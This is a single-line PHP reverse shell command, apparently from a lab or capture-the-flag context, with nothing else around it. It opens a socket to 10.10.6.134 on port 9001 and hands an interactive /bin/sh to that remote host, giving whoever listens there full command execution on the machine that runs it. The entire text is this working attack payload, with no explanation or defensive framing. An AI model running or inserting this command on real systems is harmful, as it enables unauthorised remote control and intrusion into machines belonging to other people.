php -r '$sock=fsockopen("10.10.6.134",9001);shell_exec("/bin/sh <&3 >&3 2>&3");'
